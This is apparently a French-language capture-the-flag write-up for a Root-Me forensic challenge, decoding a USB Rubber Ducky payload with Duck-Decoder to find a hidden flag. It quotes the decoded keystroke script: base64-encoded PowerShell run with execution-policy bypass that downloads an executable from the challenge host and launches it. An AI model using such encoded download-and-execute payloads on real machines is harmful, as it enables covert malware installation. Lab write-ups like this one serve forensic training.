link use: https://github.com/JPaulMora/Duck-Decoder

challenge interessant mais quand tu ne sais pas qu'il ya des tools pour le decodage de ce genre de fichier tu vas tourner en rond car aucun strings nio exiftool ni extraction avec binwalk ne donne de sortie.

- extraire le fichier
```
unzip ch14.zip
```

comme signifier dans mon intro j'ai fais en premier lieu strings, binwalk et autre mais rien. on devait penser a un rubber ducky donc chercher sur le net un decoder pour ca et bin on a un git pour:
```
git clone https://github.com/JPaulMora/Duck-Decoder.git
```

l'outil utilise python 2 et on a deux parametre decode et display, explication sur le git.
```
python2 Duck-Decoder/DuckDecoder.py display file.bin
```

- nous avons une sortie ayant un lien menant a une image sur lequel est marque vous avez ete hacker. 
http://challenge01.root-me.org/forensic/ch14/files/796f75277665206265656e2054524f4c4c4544.jpg
faut savoir que le nom de l image etait un peu suspect on l'a donc decode l hexa qui nous donne cette sortie qui n'est pas le flag (j'y ai cru :) )
	you've been TROLLED

- enregistrement de l'mage et extraire des infos avec exiftool et srings etc mais rien de concret.
```
exiftool 666c61676765643f.exe  
2078  file 666c61676765643f.exe  
2079  xxd 666c61676765643f.exe  
2080  hexdump 666c61676765643f.exe  
2081  binwalk 666c61676765643f.exe  
2082  binwalk -e 666c61676765643f.exe  
2083  strings 666c61676765643f.exe
```

- extraction et decodage du code contenu dans la sortie de l outil duck decode
```
STRING PowerShell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGMAaABhAGwAbABlAG4AZwBlADAAMQAuAHIAbwBvAHQALQBtAGUALgBvAHIAZwAvAGYAbwByAGUAbgBzAGkAYwAvAGMAaAAxADQALwBmAGkAbABlAHMALwA2ADYANgBjADYAMQA2ADcANgA3ADYANQA2ADQAMwBmAC4AZQB4AGUAJwAsACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AApowershell -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAGMAbwBtACAAcwBoAGUAbABsAC4AYQBwAHAAbABpAGMAYQB0AGkAbwBuACkALgBzAGgAZQBsAGwAZQB4AGUAYwB1AHQAZQAoACcANgA2ADYAYwA2ADEANgA3ADYANwA2ADUANgA0ADMAZgAuAGUAeABlACcAKQA7AAoAexit
```
decode base 64:
```
http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe
```

- telechargement de l executable:
```
wget http://challenge01.root-me.org/forensic/ch14/files/666c61676765643f.exe
```

- on a d'abord essaye d'extraire les metadonnes qui n'ont rien donner. on a donc fais un string et avons donc trouver le flag a la 108 eme ligne
```
strings 666c61676765643f.exe > test.txt
```
![Texte alternatif de l'image](image/131.png)

- #### **other solutions**
dans les write up des gars c'est pareil si tu n'as pas connaissance de ca tu peux pas piquer le challenge. qu'est ce qui va te faire penser a rubber ducky, c'est vrai que ya canard et cle mais ca parle pas vraiment. en gros faut etre cultive et etre curieux. (methode parieil que la mienne avec quelques trebuchement comme moi mais c'est cool)

